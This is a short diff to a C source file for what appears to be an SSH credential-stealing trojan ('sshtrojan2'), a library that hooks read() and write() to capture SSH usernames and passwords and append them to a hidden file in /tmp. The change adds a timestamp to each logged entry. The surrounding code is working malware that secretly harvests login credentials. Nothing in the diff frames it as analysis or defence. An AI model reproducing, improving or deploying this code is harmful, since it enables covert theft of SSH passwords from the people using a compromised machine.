@@ -7,6 +7,7 @@
 #include <sys/stat.h>
 #include <string.h>
 #include <stdbool.h>
+#include <time.h>
 
 #define _PATH_LOG "/tmp/.log_sshtrojan2.txt"
 #define _MAX_LENGTH 255
@@ -14,6 +15,16 @@
 bool is_writing = false;
 char username[_MAX_LENGTH];
 char password[_MAX_LENGTH];
+
+/*Return a string that contains current date*/
+char* cur_date(){
+	char *cur_date_str = malloc(sizeof(char) * 20);
+	time_t t = time(NULL);
+	struct tm tm = *localtime(&t);
+	sprintf(cur_date_str, "%d-%02d-%02d %02d:%02d:%02d", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);	
+
+	return cur_date_str;
+}
 
 extern ssize_t read(int __fd, void *__buf, size_t __nbytes){
 	if(__fd == 4 && strlen(__buf) == 1 && __nbytes == 1){
@@ -52,7 +63,8 @@ extern ssize_t write(int __fd, const void *__buf, size_t __n){
 		is_writing = false;
 
 		FILE *fp = fopen(_PATH_LOG, "a");
-		fprintf(fp, "\n=====NEW SSH=====\n");
+		char *cur_date_str = cur_date();
+		fprintf(fp, "\n[New SSH on %s]\n", cur_date_str);
 		fprintf(fp, "Username: %s\n", username);
 		fprintf(fp, "Password: %s\n", password);
 		fclose(fp);
